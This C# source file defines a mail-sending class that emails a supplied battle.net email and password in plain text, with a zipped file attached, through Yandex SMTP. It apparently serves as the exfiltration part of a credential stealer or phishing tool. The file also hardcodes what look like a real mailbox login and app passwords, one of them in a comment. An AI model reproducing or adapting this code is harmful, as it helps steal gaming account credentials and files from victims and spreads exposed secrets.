using MailKit.Net.Smtp;
using MimeKit;

namespace lisachusova;

public class MailSender
{
    private const string EmailAddress = "listwwwa@yandex.ru";
    private const string PasswordAddress = "xlwbaennbtvyahnd";
    //hjcyjorcurayivgp

    public static async Task<bool> SendEmailAsync(string inputEmail, string inputPassword, string subj,string filePath)
    {
        try
        {
            using var mailSender = new MimeMessage();
            
            mailSender.From.Add(new MailboxAddress("Data from battle.net", EmailAddress));
            mailSender.To.Add(new MailboxAddress("", inputEmail));
            mailSender.Subject = subj;
            var multipart = new Multipart("mixed");
            var textPart = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = $"<h4>Your data from battle.net | Email: {inputEmail} | Password: {inputPassword}</h4>"
            };
            var attachmentPart = new MimePart("application", "zip")
            {
                ContentDisposition = new ContentDisposition(ContentDisposition.Attachment),
                ContentTransferEncoding = ContentEncoding.Base64,
                FileName = Path.GetFileName(filePath)
            };

            using (var fileStream = File.OpenRead(filePath))
            {
                var memoryStream = new MemoryStream();
                await fileStream.CopyToAsync(memoryStream);
                memoryStream.Position = 0;
                attachmentPart.Content = new MimeContent(memoryStream);
            }
            
            multipart.Add(textPart);
            multipart.Add(attachmentPart);

            mailSender.Body = multipart;

            using var client = new SmtpClient();
            await client.ConnectAsync("smtp.yandex.ru", 465, true);
            client.AuthenticationMechanisms.Remove("XOAUTH2");
            await client.AuthenticateAsync(EmailAddress, PasswordAddress);
            await client.SendAsync(mailSender);
            await client.DisconnectAsync(true);
            return true;
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            throw;
        }
    }
}